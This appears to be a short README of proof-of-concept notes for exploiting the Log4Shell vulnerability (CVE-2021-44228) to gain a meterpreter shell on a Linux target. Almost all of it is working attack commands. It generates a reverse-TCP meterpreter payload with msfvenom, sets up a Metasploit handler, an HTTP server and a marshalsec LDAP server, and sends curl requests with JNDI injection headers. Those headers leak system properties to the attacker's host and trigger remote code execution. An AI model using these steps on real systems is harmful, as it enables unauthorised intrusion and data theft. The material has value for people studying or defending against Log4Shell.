# log4j-poc

Just a bunch of notes on how to exploit log4j / log4shell / CVE-CVE-2021-44228 to gain a meterpreter shell on Linux target

# Prepare attack environment

## Edit and compile Java payload
```
cd /path/to/www/html/
nano Log4jRCE.java
javac Log4jRCE.java
```

## Create msf executable
```
msfvenom -p linux/meterpreter/reverse_tcp LHOST=10.0.0.100 LPORT=4444 -f elf > met.elf
```

## Start HTTP server
```
python3 -m http.server 8888
```

## Start MSF multi handler
```
msfconsole
use exploit/multi/handler
set payload linux/meterpreter/reverse_tcp
exploit -j
```

## Start the LDAP server
```
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
apt install maven
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.0.0.100:8888/#Log4jRCE"
```

# Attack

## Information Discloure
```
curl 10.100.100.200:8080 -H 'X-Api-Version: ${jndi:ldap://10.0.0.100:1389/${sys:java.version}}'
curl 10.100.100.200:8080 -H 'X-Api-Version: ${jndi:ldap://10.0.0.100:1389/${sys:os.name}}'
curl 10.100.100.200:8080 -H 'X-Api-Version: ${jndi:ldap://10.0.0.100:1389/${sys:user.name}}'
```

see more: https://dev.to/therceman/log4j-vulnerability-cheatsheet-m39

## RCE
```
curl 10.100.100.200:8080 -H 'X-Api-Version: ${jndi:ldap://10.0.0.100:1389/Log4jRCE}'
```
